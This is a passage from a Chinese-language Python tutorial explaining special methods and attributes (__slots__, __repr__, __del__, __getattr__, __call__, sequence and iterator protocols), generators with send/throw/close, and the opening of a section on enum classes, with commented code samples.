</pre><textarea>
class Student(object):
    __slots__ = ('name', 'age')  # 用tuple定义允许绑定的属性名称

s = Student()                # 创建新的实例
s.name = 'Michael'           # 绑定属性'name'
s.age = 25                   # 绑定属性'age'
s.score = 99                 # AttributeError: 'Student' object has no attribute 'score'

class GraduateStudent(Student):
    pass

g = GraduateStudent()
g.score = 9999

</textarea> __slots__=('walk','age', 'name')程序只允许为Dog实例动态添加walk、age、name这三个属性或方法,如果尝试为Dog对象添加其他额外属性就会引发AttributeError<textarea>
class Dog:
    __slots__ = ('walk', 'age', 'name')

    def __init__(self, name):
        self.name = name

    def test():
        print('预先定义的test方法')

d = Dog('Snoopy')
from types import MethodType
# 只允许动态为实例添加walk、age、name这3个属性或方法
d.walk = MethodType(lambda self: print('%s正在慢慢地走' % self.name), d)
d.age = 5
d.walk()
d.foo = 30 # AttributeError

# __slots__属性并不限制通过类来动态添加属性或方法
Dog.bar = lambda self: print('abc')
d.bar()

</textarea>

<h4>定制类</h4><pre>
在Python类中有些方法名、属性名的前后都添加了双下画线,这种方法、属性通常都属于Python的特殊方法和特殊属性,开发者可以通过重写这些方法或直接调用这些方法来实现特殊的功能

【 打印实例对象时自动调用类的__str__或__repr__方法 】
当使用print()方法输出Item对象时,实际上输出的是Item对象的__repr__()方法的返回值,下面两行代码的效果完全一样:
print (im)
print (im.__repr__)

__repr__()是Python类中的一个特殊方法,由于object类己提供了该方法,而所有的Python类都是object类的子类,因此所有的Python对象都具有__repr__()方法。
因此当程序需要将任何对象与字符串进行连接时都可先调用__repr__()方法将对象转换成字符串,然后将两个字符串连接在一起
im str = im.__repr() + ""

__repr__()是一个非常特殊的方法,它是一个"自我描述"的方法,该方法通常用于实现这样一个功能:当程序员直接打印该对象时,系统将会输出该对象的"自我描述"信息,用来告诉外界该对象具有的状态信息。
object类提供的__repr__()方法总是返回该对象实现类的"类名+object at+内存地址"值,这个返回值并不能真正实现"自我描述"的功能,因此如果用户需要自定义类能实现"自我描述"的功能就必须重写__repr__()方法

</pre><textarea>
class Student(object):
    def __init__(self, name):
        self.name = name

s = Student('Michael')
print(s)            # < __main__.Student object at 0x7f1c7934c358>

print(dir(s))
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'name']

print (s.__str__)         # < method-wrapper '__str__' of Student object at 0x7f1c7934c358>
print (s.__repr__)        # < method-wrapper '__repr__' of Student object at 0x7f1c7934c358>

class Student(object):
    def __init__(self, name):
        self.name = name
    def __str__(self):
        return 'Student object (name: %s)' % self.name

print(Student('Michael'))   # Student object (name: Michael)

# 这样打印出来的实例,不但好看,而且容易看出实例内部重要的数据。直接敲变量不用print,打印出来的实例还是不好看
>>> s = Student('Michael')
>>> s   # <__main__.Student object at 0x109afb310>

# 这是因为直接显示变量调用的不是__str__(),而是__repr__(),两者的区别是__str__()返回用户看到的字符串,而__repr__()返回程序开发者看到的字符串,即__repr__()是为调试服务的。解决办法是再定义一个__repr__()。但是通常__str__()和__repr__()代码都是一样的,所以有个偷懒的写法

class Student(object):
    def __init__(self, name):
        self.name = name
    def __str__(self):
        return 'Student object (name=%s)' % self.name
    __repr__ = __str__

</textarea><pre>
【 __del__方法:销毁对象 】
与__init__()方法对应的是__del__()方法,__init__()方法用于初始化Python对象,而__del__()则用于销毁Python对象,即在任何Python对象将要被系统回收之时,系统都会自动调用该对象的__del__()方法。

当程序不再需要一个Python对象时,系统必须把该对象所占用的内存空间释放出来,这个过程被称为垃圾回收(GC,Garbage Collector),Python会自动回收所有对象所占用的内存空间,因此开发者无须关心对象垃圾回收的过程。
Python采用自动引用计数(ARC)方式来回收对象所占用的空间,当程序中有一个变量引用该Python对象时,Python会自动保证该对象引用计数为1;当程序中有两个变量引用该Python对象时,Python会自动保证该对象引用计数为2,依此类推,如果一个对象的引用计数变成了0,则说明程序中不再有变量引用该对象,表明程序不再需要该对象,因此Python就会回收该对象。

大部分时候,Python的ARC都能准确、高效地回收系统中的每个对象。但如果系统中出现循环引用的情况,比如对象a持有一个实例变量引用对象b,而对象b又持有一个实例变量引用对象 a,此时两个对象的引用计数都是1,而实际上程序已经不再有变量引用它们,系统应该回收它们,此时Python的垃圾回收器就可能没那么快,要等专门的循环垃圾回收器(Cyclic Garbage Collector)来检测并回收这种引用循环。

当一个对象被垃圾回收时,Python就会自动调用该对象的__del__方法。不要以为对一个变量执行del操作,该变量所引用的对象就会被回收,只有当对象的引用计数变成0时,该对象才会被回收。因此如果一个对象有多个变量引用它,那么del其中一个变量是不会回收该对象的

如果父类提供了__del__()方法,则系统重写__del__()方法时必须显式调用父类的__del__()方法,这样才能保证合理地回收父类实例的部分属性

</pre><textarea>
class Item:
    def __init__ (self, name, price):
        self.name = name
        self.price = price
    # 定义析构函数
    def __del__ (self):
        print('del删除对象')

# 创建一个Item对象,将之赋给im变量
im = Item('鼠标', 29.8)
x = im
# 打印im所引用的Item对象
del im
print('end')

# del im执行之后程序并没有回收Item对象,只有等到程序执行将要结束时(系统必须回收所有对象),系统才会回收Item对象。
end
del删除对象

# 如果将程序中x = im代码注释掉,当程序执行del im之后,此时程序中不再有任何变量引用该Item对象,因此系统会立即回收该对象,则无须等到程序结束之前
del删除对象
end

</textarea><pre>
【 __dir__用法:列出对象的所有属性(方法)名 】
对象的 __dir__ 方法用于列出该对象内部的所有属性(包括方法)名,该方法将会返回包含所有属性(方法)名的序列
当程序对某个对象执行 dir(object) 函数时,实际上就是将该对象的 __dir__() 方法返回值进行排序,然后包装成列表

</pre><textarea>
class Item:
    def __init__ (self, name, price):
        self.name = name
        self.price = price
    def info ():
        pass
# 创建一个Item对象,将之赋给im变量
im = Item('鼠标', 29.8)
print(im.__dir__())  # 返回所有属性(包括方法)组成列表
print(dir(im))  # 返回所有属性(包括方法)排序之后的列表

# 输出:不仅会输出为对象定义的name、 price、 info三个属性和方法,而且还有大量系统内置的属性和方法
['name', 'price', '__module__', '__init__', 'info', '__dict__', '__weakref__', '__doc__', '__repr__', '__hash__', '__str__', '__getattribute__', '__setattr__', '__delattr__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__new__', '__reduce_ex__', '__reduce__', '__subclasshook__', '__init_subclass__', '__format__', '__sizeof__', '__dir__', '__class__']
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'info', 'name', 'price']

</textarea><pre>
【 __dict__属性:查看对象内部所有属性名和属性值组成的字典,通常程序直接使用该属性即可 】
程序使用 __dict__ 属性既可查看对象的所有内部状态,也可通过字典语法来访问或修改指定属性的值

</pre><textarea>
class Item:
    def __init__ (self, name, price):
        self.name = name
        self.price = price

im = Item('鼠标', 28.9)

print(im.__dict__)            # {'name': '鼠标', 'price': 28.9}
# 通过__dict__访问name属性
print(im.__dict__['name'])    # 鼠标
# 通过__dict__访问price属性
print(im.__dict__['price'])   # 28.9

im.__dict__['name'] = '键盘'
im.__dict__['price'] = 32.8
print(im.name)                # 键盘
print(im.price)               # 32.8

</textarea><pre>
【 setattr()、getattr()、hasattr()函数 】
在动态检查对象是否包含某些属性(包括方法〉相关的函数有如下几个:
hasattr(obj, name):检查obj对象是否包含名为name的属性或方法。
getattr(object, name[, default]):获取object对象中名为name的属性的属性值。
setattr(obj, name, value,/):将obj对象的name属性设为value

</pre><textarea>
class Comment:
    def __init__ (self, detail, view_times):
        self.detail = detail
        self.view_times = view_times
    def info ():
        print("一条简单的评论,内容是%s" % self.detail)

c = Comment('疯狂Python讲义很不错', 20)

# 判断是否包含指定的属性或方法
print(hasattr(c, 'detail'))      # True
print(hasattr(c, 'view_times'))  # True
print(hasattr(c, 'info'))        # True

# 获取指定属性的属性值
print(getattr(c, 'detail'))      # '疯狂Python讲义很不错'
print(getattr(c, 'view_times'))  # 20
# 由于info是方法,故下面代码会提示:name 'info' is not defined
#print(getattr(c, info, '默认值'))

# 为指定属性设置属性值
setattr(c, 'detail', '天气不错')
setattr(c, 'view_times', 32)
# 输出重新设置后的属性值
print(c.detail)
print(c.view_times)

# 设置不存在的属性,即为对象添加属性
setattr(c, 'test', '新增的测试属性')
print(c.test) # 新增的测试属性

# 实际上setattr()函数还可对方法进行设置,在使用setattr()函数重新设置对象的方法时,新设置的方法是未绑定方法
def bar ():
    print('一个简单的bar方法')
# 将c的info方法设为bar函数,程序调用Comment对象的info()方法,其实就是调用程序中的bar()函数
setattr(c, 'info', bar)
c.info()   # 一个简单的bar方法

# 不仅如此,程序完全可通过setattr()函数将info()方法设置成普通值,这样将会把info变成一个属性,而不是方法
setattr(c, 'info', 'fkit')
c.info()

</textarea>__getattr__<textarea>
# 正常情况下调用类的方法或属性不存在时就会报错
class Student(object):

    def __init__(self):
        self.name = 'Michael'

s = Student()
print(s.name)   # Michael
print(s.score)  # 报错AttributeError: 'Student' object has no attribute 'score'

# 要避免这个错误,除了可以加上一个score属性外,Python还有另一个机制,那就是写一个__getattr__()方法动态返回一个属性
# 当调用不存在的属性时,比如score,Python解释器会试图调用__getattr__(self, 'score')来尝试获得属性,这样就有机会返回score的值
class Student(object):

    def __init__(self):
        self.name = 'Michael'

    def __getattr__(self, attr):
        if attr=='score':
            return 99

s = Student()
print(s.name)   # 'Michael'
print(s.score)  # 99

# 返回函数也是完全可以的:
class Student(object):

    def __getattr__(self, attr):
        if attr=='age':
            return lambda: 25

s = Student()
print(s.age())  # 25

# 只有在没有找到属性的情况下才调用__getattr__,已有的属性不会在__getattr__中查找。
# 任意调用如s.abc都会返回None,因为定义的__getattr__默认返回就是None。要让class只响应特定的几个属性就要按照约定,抛出AttributeError的错误:
class Student(object):

    def __getattr__(self, attr):
        if attr=='age':
            return lambda: 25
        raise AttributeError('\'Student\' object has no attribute \'%s\'' % attr)

# 这实际上可以把一个类的所有属性和方法调用全部动态化处理了,不需要任何特殊手段。
# 这种完全动态调用的特性有什么实际作用呢？作用就是可以针对完全动态的情况作调用。
# 现在很多网站都搞REST API,比如新浪微博、豆瓣啥的,调用API的URL类似:
# http://api.server/user/friends
# http://api.server/user/timeline/list
# 如果要写SDK,给每个URL对应的API都写一个方法,那得累死,而且API一旦改动,SDK也要改。
# 利用完全动态的__getattr__,可以写出一个链式调用,这样无论API怎么变,SDK都可以根据URL实现完全动态的调用,而且不随API的增加而改变

class Chain(object):

    def __init__(self, path=''):
        self._path = path

    def __getattr__(self, path):
        return Chain('%s/%s' % (self._path, path))

    def __str__(self):
        return self._path

    __repr__ = __str__

print(Chain().status.user.timeline.list)  # /status/user/timeline/list

还有些REST API会把参数放到URL中,比如GitHub的API:
GET /users/:user/repos
调用时需要把:user替换为实际用户名。如果能写出这样的链式调用:
Chain().users('michael').repos
就可以非常方便地调用API了

</textarea><pre>
【 __call__方法 】
用hasattr()函数判断指定属性或方法是否存在,但到底是属性还是方法则需要进一步判断它是否可调用。程序可通过判断该属性或方法是否包含__call__属性来确定它是否可调用

</pre><textarea>
class User:
    def __init__(self, name, passwd):
        self.name = name
        self.passwd = passwd
    def validLogin (self):
        print('验证%s的登录' % self.name)

u = User('crazyit', 'leegang')
# 判断u.name是否包含__call__方法,即判断是否可调用
print(hasattr(u.name, '__call__'))         # False
# 判断u.passwd是否包含__call__方法,即判断是否可调用
print(hasattr(u.passwd, '__call__'))       # False
# 判断u.validLogin是否包含__call__方法,即判断是否可调用
print(hasattr(u.validLogin, '__call__'))   # True

</textarea>实际上一个函数(甚至对象)之所以能执行关键就在于__call__()方法,x(arg1, arg2,...)只是x.__call__(arg1, arg2, ...)的快捷写法,因此可以为自定义类添加__call__方法,从而使得该类的实例也变成可调用的<textarea>
class Role:
    def __init__ (self, name):
        self.name = name

    # 定义__call__方法
    def __call__(self):
        print('执行Role对象')

r = Role('管理员')
# 直接调用Role对象,就是调用该对象的__call__方法
r()           # 执行Role对象
r.__call__()  # 执行Role对象

</textarea>对于程序中的函数,同样既可使用函数的语法来调用它,也可把函数当成对象,调用它的 __call__ 方法<textarea>
def foo ():
    print('--foo函数--')
# 下面示范了2种方式调用foo()函数
foo()
foo.__call__()

</textarea><textarea>
# 一个对象实例可以有自己的属性和方法,当调用实例方法时用instance.method()来调用,能直接在实例本身上调用,任何类只需要定义一个__call__()方法就可以直接对实例进行调用
class Student(object):
    def __init__(self, name):
        self.name = name

    def __call__(self):
        print('My name is %s.' % self.name)

s = Student('Michael')
s()       # self参数不要传入,输出My name is Michael.

</textarea><pre>
__call__()还可以定义参数。对实例进行直接调用就好比对一个函数进行调用一样,所以完全可以把对象看成函数,把函数看成对象,因为这两者之间本来就没啥根本的区别。
如果把对象看成函数,那么函数本身其实也可以在运行期动态创建出来,因为类的实例都是运行期创建出来的,这么一来就模糊了对象和函数的界限。
那么怎么判断一个变量是对象还是函数呢？其实更多的时候需要判断一个对象是否能被调用,能被调用的对象就是一个Callable对象,比如函数和上面定义的带有__call__()的类实例

基本上判断python对象是否为可调用的函数有三种方法：
1、使用内置的callable函数
callable(func)
用于检查对象是否可调用,返回True也可能调用失败,但是返回False一定不可调用

2、判断对象类型是否是FunctionType
type(func) is FunctionType
# 或者
isinstance(func, FunctionType)

3、判断对象是否实现__call__方法
hasattr(func, '__call__')

通过callable()函数就可以判断一个对象是否是"可调用"对象
对于函数,方法,lambda函数式,类以及实现了_ _call_ _方法的类实例,都返回True

</pre><textarea>
print(callable(Student('Michael')))  # True
print(callable(max))                 # True
print(callable([1, 2, 3]))           # False
print(callable(None))                # False
print(callable('str'))               # False

# 类和类内的方法是可调用的
class C:
  def printf(self):
  print 'This is class C!'

objC=C()
print(callable(C)) # True,类是可调用的,调用它们就产生对应的类实例.
print(callable(C.printf)) # True
print(callable(objC.printf)) # True

# lambda表达式是可调用的
f=lambda x,y:x+y
print(f(2,3))  # 5
print(callable(f))  # True

</textarea><pre>
【 __new__ 】

</pre>单例模式<textarea>
class Singleton(object):
    def __init__(self):
        pass

    def __new__(cls, *args, **kwargs):
        if not hasattr(Singleton, "_instance"): # 反射
            Singleton._instance = object.__new__(cls)
        return Singleton._instance

obj1 = Singleton()
obj2 = Singleton()
print(obj1, obj2) #<__main__.Singleton object at 0x004415F0> <__main__.Singleton object at 0x004415F0>

</textarea><pre>
【 序列相关操作 __getitem__、__setitem__、__delitem__、__len__、__contains__用法 】
序列最重要的特征就是可包含多个元素,因此和序列有关的特殊方法有如下几个:
__len__(self):该方法的返回值决定序列中元素的个数。
__getitem__(self, key):该方法获取指定索引对应的元素。该方法的key应该是整数值或slice对象,否则该方法会引发KeyError异常。
__contains__(self, item):该方法判断序列是否包含指定元素。
__setitem__(self, key, value):该方法设置指定索引对应的元素。该方法的 key 应该是整数值或 slice对象,否则该方法会引发 KeyError 异常。
__delitem__(self, key):该方法删除指定索引对应的元素。

如果程序要实现不可变序列(程序只能获取序列中的元素,不能修改),只要实现上面前3个方法就行;如果程序要实现可变序列(程序既能获取序列中的元素,也可修改),则需要实现上面5个方法

</pre>实现一个字符串序列,在该字符串序列中默认每个字符串的长度都是3,该序列的元素按AAA、 AAB、 AAC…… 这种格式排列;该序列本身并不保存序列元素,序列会根据索引动态计算序列元素,因此该序列需要保存被修改、被删除的元素,程序既可对序列元素赋值,也可删除、修改序列元素,这完全是一个功能完备的序列<textarea>
def check_key (key):
    '''
    该函数将会负责检查序列的索引,该索引必须是整数值,否则引发TypeError
    且程序要求索引必须为非负整数,否则引发IndexError
    '''
    if not isinstance(key, int): raise TypeError('索引值必须是整数')
    if key < 0: raise IndexError('索引值必须是非负整数')
    if key >= 26 ** 3: raise IndexError('索引值不能超过%d' % 26 ** 3)

class StringSeq:
    def __init__(self):
        # 用于存储被修改的数据
        self.__changed = {}
        # 用于存储已删除元素的索引
        self.__deleted = []
    def __len__(self):
        return 26 ** 3
    def __getitem__(self, key):
        '''
        根据索引获取序列中元素
        '''
        check_key(key)
        # 如果在self.__changed中找到已经修改后的数据
        if key in self.__changed :
            return self.__changed[key]
        # 如果key在self.__deleted中,说明该元素已被删除
        if key in self.__deleted :
            return None
        # 否则根据计算规则返回序列元素
        three = key // (26 * 26)
        two = ( key - three * 26 * 26) // 26
        one = key % 26
        return chr(65 + three) + chr(65 + two) + chr(65 + one)
    def __setitem__(self, key, value):
        '''
        根据索引修改序列中元素
        '''
        check_key(key)
        # 将修改的元素以key-value对的形式保存在__changed中
        self.__changed[key] = value
    def __delitem__(self, key):
        '''
        根据索引删除序列中元素
        '''
        check_key(key)
        # 如果__deleted列表中没有包含被删除key,添加被删除的key
        if key not in self.__deleted : self.__deleted.append(key)
        # 如果__changed中包含被删除key,删除它
        if key in self.__changed : del self.__changed[key]

# 创建序列
sq = StringSeq()
print(sq, list(sq)) # < __main__.StringSeq object at 0x7f267804bf98>
# 获取序列的长度,实际上就是返回__len__()方法的返回值
print(len(sq))     # 17576
print(sq[26*26])   # BAA

# 打印没修改之后的sq[1]
print(sq[1])      # 'AAB'
# 修改sq[1]元素
sq[1] = 'fkit'
# 打印修改之后的sq[1]
print(sq[1])      # 'fkit'

# 删除sq[1]
del sq[1]
print(sq[1])      # None
# 再次对sq[1]赋值
sq[1] = 'crazyit'
print(sq[1])      # crazyit

</textarea><pre>
【 __iter__和__reversed__:实现迭代器 】
使用for循环遍历列表、元组和字典等,这些对象都是可迭代的,因此它们都属于迭代器。

如果开发者需要实现迭代器,只要实现如下两个方法即可:
__iter__(self):该方法返回一个迭代器(iterator),迭代器必须包含一个__next__()方法,该方法返回迭代器的下一个元素。
__reversed__(self):该方法主要为内建的reversed()反转函数提供支持,当程序调用reversed()函数对指定迭代器执行反转时,实际上是由该方法实现的。
如果程序不需要让迭代器反转迭代,其实只需要实现第一个方法即可

如果一个类想被用于for ... in循环就必须实现一个__iter__()方法,该方法返回一个迭代对象,然后Python的for循环就会不断调用该迭代对象的__next__()方法拿到循环的下一个值,直到遇到StopIteration错误时退出循环

</pre>定义一个代表斐波那契数列(数列的元素等于前两个元素之和:f(n+2) = f(n+1) ＋f(n))的迭代器<textarea>
# 定义一个代表斐波那契数列的迭代器
class Fibs:
    def __init__(self, len):
        self.first = 0
        self.sec = 1
        self.__len = len
    # 定义迭代器所需的__next__方法,返回数列的下二个值
    def __next__(self):
        # 程序使用len属性控制数列的剩余长度,当__len__属性为0时程序停止遍历结束迭代
        if self.__len == 0:
            raise StopIteration
        # 完成数列计算:
        self.first, self.sec = self.sec, self.first + self.sec
        # 数列长度减1
        self.__len -= 1
        return self.first
    # 定义__iter__方法,该方法返回迭代器
    def __iter__(self):
        return self

# 创建Fibs对象
fibs = Fibs(10)
# 获取迭代器的下一个元素
print(next(fibs))       # 1
# 使用for循环遍历迭代器
for el in fibs:
    print(el, end=' ')  # 1 2 3 5 8 13 21 34 55

</textarea><textarea>
class Fib(object):
    def __init__(self):
        self.a, self.b = 0, 1      # 初始化两个计数器a,b

    def __iter__(self):
        return self                # 实例本身就是迭代对象,故返回自己

    def __next__(self):
        self.a, self.b = self.b, self.a + self.b   # 计算下一个值
        if self.a > 100000:        # 退出循环的条件
            raise StopIteration()
        return self.a              # 返回下一个值

for n in Fib():
    print(n, end=' ')

# 输出: 1 1 2 3 5 ... 46368 75025

</textarea>程序可使用内置的iter()函数将列表、元组等转换成迭代器<textarea>
# 将列表转换为迭代器
my_iter = iter([2, 'fkit', 4])
# 依次获取迭代器的下一个元素
print(my_iter.__next__()) # 2
print(my_iter.__next__()) # fki

</textarea><pre>
【 __getitem__ 】
Fib实例虽然能作用于for循环,看起来和list有点像,但是把它当成list来使用还是不行

</pre><textarea>
>>> Fib()[5]
Traceback (most recent call last):
  File "< stdin>", line 1, in < module>
TypeError: 'Fib' object does not support indexing

# 要表现得像list那样按照下标取出元素,需要实现__getitem__()方法:
class Fib(object):
    def __getitem__(self, n):
        a, b = 1, 1
        for x in range(n):
            a, b = b, a + b
        return a

# 现在就可以按下标访问数列的任意一项了:
f = Fib()
print(f[0])  # 1
print(f[1])  # 1
print(f[2])  # 2
print(f[30]) # 1346269

# 但是list有个神奇的切片方法:
>>> list(range(100))[5:10]
[5, 6, 7, 8, 9]

# 对于Fib却报错。原因是__getitem__()传入的参数可能是一个int,也可能是一个切片对象slice,所以要做判断:
class Fib(object):
    def __getitem__(self, n):
        if isinstance(n, int): # n是索引
            a, b = 1, 1
            for x in range(n):
                a, b = b, a + b
            return a
        if isinstance(n, slice): # n是切片
            start = n.start
            stop = n.stop
            if start is None:
                start = 0
            a, b = 1, 1
            L = []
            for x in range(stop):
                if x >= start:
                    L.append(a)
                a, b = b, a + b
            return L

# 现在试试Fib的切片:
f = Fib()
print(f[0:5])  # [1, 1, 2, 3, 5]
print(f[:10])  # [1, 1, 2, 3, 5, 8, 13, 21, 34, 55]

# 但是没有对step参数作处理:
>>> f[:10:2]
[1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89]
也没有对负数作处理,所以要正确实现一个__getitem__()还是有很多工作要做的。
如果把对象看成dict,__getitem__()的参数也可能是一个可以作key的object,例如str。
与之对应的是__setitem__()方法,把对象视作list或dict来对集合赋值。最后还有一个__delitem__()方法用于删除某个元素。

总之通过上面的方法自定义的类表现得和Python自带的list、tuple、dict没什么区别,这完全归功于动态语言的"鸭子类型",不需要强制继承某个接口。

</textarea><pre>
【 生成器 】
生成器和迭代器的功能非常相似,它也会提供__next__()方法,这意味着程序同样可调用内置的next()函数来获取生成器的下一个值,也可使用for循环来遍历生成器。
生成器与迭代器的区别在于,迭代器通常是先定义一个迭代器类,然后通过创建实例来创建迭代器;而生成器则是先定义一个包含yield语句的函数,然后通过调用该函数来创建生成器。

生成器是一种非常优秀的语法,Python使用生成器可以让程序变得很优雅。

生成器是Python的一个特色功能,在其他语言中往往没有对应的机制,因此很多Python开发者对生成器机制不甚了解。但实际上生成器是一种非常优秀的机制,以实际开发的经验来看,使用生成器至少有以下几个优势:
1、当使用生成器来生成多个数据时,程序是按需获取数据的,它不会一开始就把所有数据都生成出来,而是每次调用next()获取下一个数据时,生成器才会执行一次,因此可以减少代码的执行次数。程序不会一开始就把生成器函数中的循环都执行完成,而是每次调用 next() 时才执行一次循环体。
2、当函数需要返回多个数据时,如果不使用生成器,程序就需要使用列表或元组来收集函数返回的多个值,当函数要返回的数据量较大时,这些列表、元组会带来一定的内存开销。如果使用生成器就不存在这个问题,生成器可以按需、逐个返回数据。
3、使用生成器的代码更加简洁。

Python主要提供了以下两种方式来创建生成器:
1、使用for循环的生成器推导式即元祖推导式
2、调用带yield语句的生成器函数。

创建生成器需要两步操作:
1、定义一个包含yield语句的函数。
2、调用第1步创建的函数得到生成器,调用包含yield语句的函数并不会立即执行,它只是返回一个生成器,只有当程序通过next()函数调用生成器或遍历生成器时函数才会真正执行

</pre>使用生成器来定义一个差值递增的数列。程序先定义了一个包含 yield 语句的函数<textarea>
# 函数只是简单地遍历区间,并将循环计数器乘以 step 后添加到 cur 变量上,该数列中两个值之间的差值会逐步递增
def test(val, step):
    print("--------函数开始执行------")
    cur = 0
    for i in range(val):   # 遍历0～val
        cur += i * step    # cur添加i*step
        print(cur, end =' ')

test(10, 2)  # 0 2 6 12 20 30 42 56 72 90

def test(val, step):
    '''yield cur语句的作用有两点:1、每次返回一个值,有点类似于return语句。2、冻结执行,程序每次执行到yield语句时就会被暂停,在程序被yield语句冻结之后,当程序再次调用next()函数获取生成器的下一个值时程序才会继续向下执行'''
    print("--------函数开始执行------")
    cur = 0
    for i in range(val):   # 遍历0～val
        cur += i * step    # cur添加i*step
        yield cur

# 执行函数,返回生成器,当程序执行t = test(10, 2)调用函数时,程序并未开始执行test()函数;当程序第一次调用next(t)时,test()函数才开始执行
t = test(10, 2)
print('=================')
# 获取生成器的第一个值
# 当程序调用next(t)时生成器会返回yield cur语句返回的值(第一次返回0),程序被冻结在yield语句处
print(next(t)) # 0,生成器冻结在yield处;
# 当程序第二次调用next(t)时,程序的冻结被解除,继续向下执行,这一次循环计数器i变成1,在执行cur += i * step之后cur变成2 ,生成器再次返回yield cur语句返回的值(这一次返回 2),程序再次被冻结在该yield语句处
print(next(t)) # 2,生成器再次冻结在yield处;

# 程序可使用for循环来遍历生成器,相当于不断地使用next()函数获取生成器的下一个值
for ele in t:
print(ele, end=' ')  # 6 12 20 30 42 56 72 90,由于前面两次调用next()函数已经获取了生成器的前两个值,因此此处循环时第一次输出的值就是6

# 程序可使用list()函数将生成器能生成的所有值转换成列表,也可使用tuple()函数将生成器能生成的所有值转换成元组
#再次创建生成器
t = test(10, 1)
#将生成器转换成列表
print (list (t))
#再次创建生成器
t = test(10, 3)
#将生成器转换成元组
print(tuple(t))

# 输出结果:
--------函数开始执行------
[0 , 1 , 3, 6 , 10 , 15 , 21 , 28 , 36 , 45]
--------函数开始执行------
(0 , 3 , 9 , 18 , 30 , 45 , 63 , 84 , 108, 135)

</textarea><pre>
生成器的方法
当生成器运行起来之后,开发者还可以为生成器提供值,通过这种方式让生成器与"外部程序"动态地交换数据。

为了实现生成器与"外部程序" 动态地交换数据,需要借助于生成器的send()方法,该方法的功能与next()函数的功能非常相似,它们都用于获取生成器所生成的下一个值,并将生成器冻结在yield语句处;但send()方法可以接收一个参数,该参数值会被发送给生成器函数。

在生成器函数内部,程序可通过yield表达式来获取send()方法所发送的值,这意味着此时程序应该使用一个变量来接收yield语句的值。如果程序依然使用next()函数来获取生成器所生成的下一个值,那么yield语句返回None。

归纳起来就是两句话:
外部程序通过send()方法发送数据。
生成器函数使用yield语句接收收据。

只有等到生成器被冻结之后,外部程序才能使用send()方法向生成器发送数据。获取生成器第一次所生成的值,应该使用next()函数;如果程序非要使用send()方法获取生成器第一次所生成的值,也不能向生成器发送数据,只能为该方法传入None参数。

</pre>下面程序示范了向生成器发送数据。该程序会依次生成每个整数的平方值,但外部程序可以向生成器发送数据,当生成器接收到外部数据之后会生成外部数据的平方值<textarea>
def square_gen(val):
    i = 0
    out_val = None
    while True:
        # 使用yield语句生成值,使用out_val接收send()方法发送的参数值
        out_val = (yield out_val ** 2) if out_val is not None else (yield i ** 2)
        # 如果程序使用send()方法获取下一个值,out_val会获取send()方法的参数
        if out_val is not None : print("====%d" % out_val)
        i += 1

sg = square_gen(5)
# 第一次调用send()方法获取值,只能传入None作为参数
print(sg.send(None))  # 0
print(next(sg))  # 1
print('--------------')
# 调用send()方法获取生成器的下一个值,参数9会被发送给生成器
print(sg.send(9))  # 81
# 再次调用next()函数获取生成器的下一个值
print(next(sg))  # 9

</textarea><pre>
该程序与前面的简单生成器程序的区别就在于第6行代码,这行代码在yield语句(yield语句被放在if表达式中,整个表达式只会运回一个yield语句)的左边放了一个变量,该变量就用于接受生成器send()方法所发送的值。

上面程序第一次使用生成器的send()方法来获取生成器的下一个值,因此只能为send()方法传入None作为参数。程序执行到第9行代码,由于此时out_val为None ,因此程序执行yield i**2(生成器返回0),程序被冻结。注意,当程序被冻结时,程序还未对out_val变量赋值,因此看到第一次获取生成器的值为0 。

通过上面的执行过程不难看出,生成器根本不能获取第一次调用send()方法发送的参数值,这就是Python要求生成器第一次调用send()方法时只能发送None参数的原因。

接下来程序调用next(sg)获取生成器的下一个值,程序从冻结处(对out_val赋值)向下执行。由于此处调用next()函数获取生成器的下一个值,因此out_val被赋值为None,所以程序执行yield i**2(生成器返回1),程序再次被冻结。

接下来程序调用sg.send(9)获取生成器的下一个值,程序从冻结处(对out_val赋值)向下执行。由于此处调用send(9)方法获取生成器的下一个值,因此out_val被赋值为9,所以程序执行yield out_val**2(生成器返回81),程序再次被冻结。因此看到本次获取生成器的值为 81。

程序再次调用next(sg)获取生成器的下一个值,程序从冻结处(对out_val赋值)向下执行。由于此处调用next()函数获取生成器的下一个值,因此out_val被赋值为None,所以程序执行yield i**2(此时i己经递增到3,因此生成器返回9),程序再次被冻结。因此看到本次获取生成器的值为 9。

运行上面程序,可以看到如下输出结果:
0
1
--------------
====9
81
9

此外,生成器还提供了如下两个常用方法:
close():该方法用于停止生成器。
throw():该方法用于在生成器内部(yield 语句内)引发一个异常。

例如,在程序中增加如下代码:
# 让生成器引发异常
sg.throw(ValueError)
运行上面代码,将看到如下输出结果:
Traceback (most recent call last):
  File "C:\Users\mengma\Desktop\1.py", line 21, in < module>
    sg.throw(ValueError)
  File "C:\Users\mengma\Desktop\1.py", line 6, in square_gen
    out_val = (yield out_val ** 2) if out_val is not None else (yield i ** 2)
ValueError

从上面的输出结果可以看到,在程序调用生成器的throw() 方法引发异常之后,程序就会在yield语句中引发该异常。

将上面的sg.throw(ValueError)代码注释掉,为程序增加如下两行代码来示范stop()方法的用法。在程序调用stop()方法关闭生成器之后,程序就不能再去获取生成器的下一个值,否则就会引发异常。
# 关闭生成器
sg.close()
print(next(sg)) # StopIteration
运行上面代码,可以看到如下输出结果:
Traceback (most recent call last):
  File "C:\Users\mengma\Desktop\1.py", line 24, in < module>
    print(next(sg)) # StopIteration
StopIteration

</pre>

<h4>使用枚举类</h4><pre>
在某些情况下,一个类的对象是有限且固定的,比如季节类只有4个对象;再比如行星类目前只有8个对象,在Python中这种实例有限且固定的类被称为枚举类

</pre>程序有两种方式来定义枚举类<textarea>
### 1、直接使用Enum列出多个枚举值来创建枚举类
import enum
# 使用Enum()函数即Enum的构造方法来定义Season枚举类,该构造方法的第一个参数是枚举类的类名;第二个参数是一个元组,用于列出所有枚举值
